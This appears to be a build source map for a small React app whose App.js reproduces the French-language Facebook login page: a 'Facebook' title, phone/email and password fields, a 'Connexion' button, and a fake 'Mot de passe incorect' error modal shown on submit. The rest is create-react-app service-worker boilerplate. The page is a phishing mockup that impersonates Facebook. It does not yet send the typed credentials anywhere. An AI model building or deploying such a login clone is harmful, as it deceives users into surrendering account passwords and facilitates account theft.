{"version":3,"sources":["logo.svg","App.js","serviceWorker.js","index.js"],"names":["module","exports","App","useState","openModal","setOpenModal","exitModal","document","querySelector","classList","remove","className","htmlFor","type","name","id","onClick","add","Boolean","window","location","hostname","match","ReactDOM","render","StrictMode","getElementById","navigator","serviceWorker","ready","then","registration","unregister","catch","error","console","message"],"mappings":"4IAAAA,EAAOC,QAAU,IAA0B,kC,oHC6G5BC,MAzGf,WAAgB,IAAD,EAEqBC,oBAAS,GAF9B,mBAENC,EAFM,KAEKC,EAFL,KA2BPC,EAAY,WAChBD,GAAa,GACKE,SAASC,cAAc,iBAC/BC,UAAUC,OAAO,cAK7B,OACE,kBAAC,WAAD,KACE,yBAAKC,UAAU,aACX,yBAAKA,UAAU,oBACX,0BAAMA,UAAU,YAAhB,aAGJ,yBAAKA,UAAU,QACb,yBAAKA,UAAU,iBACb,2BAAOC,QAAQ,IAAf,iCAGA,2BAAOC,KAAK,OAAOC,KAAK,GAAGC,GAAG,GAAGJ,UAAU,WAE7C,yBAAKA,UAAU,iBACb,2BAAOC,QAAQ,IAAf,gBAGA,2BAAOC,KAAK,WAAWC,KAAK,GAAGC,GAAG,GAAGJ,UAAU,WAGjD,yBAAKA,UAAU,kBACb,4BAAQE,KAAK,SAASF,UAAU,gBAAgBK,QArDtC,WACFT,SAASC,cAAc,iBAC/BC,UAAUQ,IAAI,aACxBZ,GAAa,KAkDH,cAKF,uBAAGM,UAAU,UAAb,4BAGA,yBAAKA,UAAU,WACb,yBAAKA,UAAU,QACb,yBAAKA,UAAU,WACb,8BAEF,oCACA,yBAAKA,UAAU,WACb,+BAGJ,yBAAKA,UAAU,cACb,4BAAQA,UAAU,iBAAlB,wBAMJ,yBAAKA,UAAU,QACb,uBAAGA,UAAU,QAAb,YACA,uBAAGA,UAAU,UAAb,wBACA,uBAAGA,UAAU,QAAb,iBAGF,uBAAGA,UAAU,QAAb,uBAKR,yBAAKA,UAAU,GAAGI,GAAG,iBA3EdX,EAAa,yBAAKO,UAAU,mBACnC,yBAAKA,UAAU,SACX,2BAAG,qDACH,uGACA,4BAAQK,QAASV,EAAWK,UAAU,MAAtC,QAEI,OChBQO,QACW,cAA7BC,OAAOC,SAASC,UAEe,UAA7BF,OAAOC,SAASC,UAEhBF,OAAOC,SAASC,SAASC,MACvB,2DCZNC,IAASC,OACP,kBAAC,IAAMC,WAAP,KACE,kBAAC,EAAD,OAEFlB,SAASmB,eAAe,SDyHpB,kBAAmBC,WACrBA,UAAUC,cAAcC,MACrBC,MAAK,SAAAC,GACJA,EAAaC,gBAEdC,OAAM,SAAAC,GACLC,QAAQD,MAAMA,EAAME,c","file":"static/js/main.5144a276.chunk.js","sourcesContent":["module.exports = __webpack_public_path__ + \"static/media/logo.5d5d9eef.svg\";","import React, { Fragment,useState } from 'react';\nimport logo from './logo.svg';\nimport './App.css';\n\nfunction App() {\n\n  const [openModal, setOpenModal] = useState(false)\n\n  const set_animation = ()=>{\n    const hide_body = document.querySelector('#hide_body_id')\n    hide_body.classList.add('hide_body')\n    setOpenModal(true)\n  //  setInterval(() => {\n\n  //  }, 1000);\n  }\n\n\n  \n\n\n  const modalContent = ()=>{\n    return openModal ? (<div className=\"modal_container\">\n    <div className=\"modal\">\n        <p><b>Mot de passe incorect</b></p>\n        <p>Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer</p>\n        <button onClick={exitModal} className=\"ok\">ok</button>\n    </div>\n  </div>) : null\n  }\n\n  const exitModal = ()=>{\n    setOpenModal(false)\n    const hide_body = document.querySelector('#hide_body_id')\n    hide_body.classList.remove('hide_body')\n  }\n\n\n\n  return (\n    <Fragment>\n      <div className=\"container\">\n          <div className=\"content-fb-title\">\n              <span className=\"title-fb\">Facebook</span>\n          </div>\n          \n          <div className=\"main\">\n            <div className=\"content-input\">\n              <label htmlFor=\"\">\n                  Numéro de mobile ou e-mail\n              </label>\n              <input type=\"text\" name=\"\" id=\"\" className=\"input\" />\n            </div>\n            <div className=\"content-input\">\n              <label htmlFor=\"\">\n                  Mot de passe\n              </label>\n              <input type=\"password\" name=\"\" id=\"\" className=\"input\"/>\n            </div>\n\n            <div className=\"content-button\">\n              <button type=\"submit\" className=\"button_submit\" onClick={set_animation}>\n                Connexion\n              </button>\n            </div>\n\n            <p className=\"forgot\">Mot de passe oublié ?</p>\n\n\n            <div className=\"line-or\">\n              <div className=\"line\">\n                <div className=\"box_one\">\n                  <hr/>\n                </div>\n                <span>ou</span>\n                <div className=\"box_two\">\n                  <hr/>\n                </div>\n              </div>\n              <div className=\"create_new\">\n                <button className=\"button_create\">\n                    Créer un compte\n                </button>\n              </div>\n            </div>\n\n            <div className=\"lang\">\n              <p className=\"text\">Malagasy</p>\n              <p className=\"active\">Français (France)</p>\n              <p className=\"text\">English (US)</p>\n             \n            </div>\n            <p className=\"text\">Autres langues...</p>\n\n          </div>\n    </div>\n\n    <div className=\"\" id=\"hide_body_id\">\n\n    </div>\n    \n{/* modal */}\n\n{modalContent()}\n\n    </Fragment>\n  );\n}\n\nexport default App;\n/**\n * Mot de passe incorrect\n * \n * Le mot de passe que vous avez saisi est incorect. Veuillez réesayer\n * \n * ok\n */","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' },\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready\n      .then(registration => {\n        registration.unregister();\n      })\n      .catch(error => {\n        console.error(error.message);\n      });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\nReactDOM.render(\n  <React.StrictMode>\n    <App />\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}